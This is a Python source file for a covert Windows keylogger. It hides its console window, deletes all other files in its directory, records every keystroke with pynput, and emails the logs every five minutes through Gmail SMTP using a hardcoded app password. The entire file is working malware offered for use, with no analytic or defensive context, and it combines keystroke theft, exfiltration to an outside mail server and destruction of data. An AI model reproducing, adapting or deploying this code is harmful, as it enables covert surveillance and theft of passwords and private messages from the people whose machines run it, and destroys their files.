import os
import sys
import time
import smtplib
import threading
import traceback
from email.mime.text import MIMEText
from threading import Timer
from pynput import keyboard
import ctypes

# --- Configuration ---
# Get the directory where the executable is located
if getattr(sys, 'frozen', False):
    # If the application is run as a bundle (compiled with PyInstaller)
    application_path = os.path.dirname(sys.executable)
else:
    # If the application is run as a script
    application_path = os.path.dirname(os.path.abspath(__file__))
    
LOG_FILE = os.path.join(application_path, "keylog.txt")
EMAIL = "your_email@gmail.com"  # Your Gmail
PASSWORD = "nrvg yhdc byyu xsca"  # Your app password
SEND_INTERVAL = 300  # seconds (5 minutes)

# --- Keylogger Code ---
log = []


def delete_files_in_dir():
    """Delete all files in current directory except the executable itself"""
    if getattr(sys, 'frozen', False):
        # If the application is run as a bundle (compiled with PyInstaller)
        exe_name = os.path.basename(sys.executable)
        current_dir = os.path.dirname(sys.executable)
    else:
        # If the application is run as a script
        exe_name = os.path.basename(__file__)
        current_dir = os.path.dirname(os.path.abspath(__file__))
    
    for filename in os.listdir(current_dir):
        file_path = os.path.join(current_dir, filename)
        try:
            if os.path.isfile(file_path) and filename != exe_name:
                os.remove(file_path)
        except Exception as e:
            pass  # Ignore errors

def send_email(log_content):
    """Send logged keystrokes via email"""
    msg = MIMEText(log_content)
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = EMAIL
    msg['To'] = EMAIL

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL, PASSWORD)
            server.send_message(msg)
    except Exception as e:
        pass  # Ignore send errors

def write_log():
    """Write collected keystrokes to log file"""
    if not log:
        return
        
    try:
        with open(LOG_FILE, "a") as f:
            f.write("".join(log))
        log.clear()
    except Exception as e:
        # Create directory if it doesn't exist
        try:
            os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
            with open(LOG_FILE, "a") as f:
                f.write("".join(log))
            log.clear()
        except Exception:
            pass  # If still fails, ignore errors

def on_press(key):
    """Callback for key press events"""
    try:
        log.append(key.char)
    except AttributeError:
        key_str = str(key).replace("Key.", "[")
        log.append(key_str + "]")

def periodic_send():
    """Periodically send collected data via email"""
    # Write any pending keystrokes to log file
    write_log()
    
    # Send log file contents via email if it exists
    try:
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                content = f.read()
            if content:
                send_email(content)
                open(LOG_FILE, "w").close()  # Clear log file after sending
    except Exception:
        pass  # Ignore errors
        
    # Schedule next execution
    Timer(SEND_INTERVAL, periodic_send).start()

def hide_console_window():
    """Hide the console window on Windows"""
    if sys.platform == "win32":
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0

def main():
    try:
        # Hide console window
        hide_console_window()
        
        # Delete any existing files
        delete_files_in_dir()
        
        # Start keylogger
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        
        # Start periodic email sending
        periodic_send()
        
        # Keep program running
        while True:
            time.sleep(10)
    except Exception as e:
        # Log any unexpected errors
        error_details = traceback.format_exc()
        
        # Try to continue running despite errors
        try:
            while True:
                time.sleep(30)
        except:
            pass

if __name__ == "__main__":
    main()
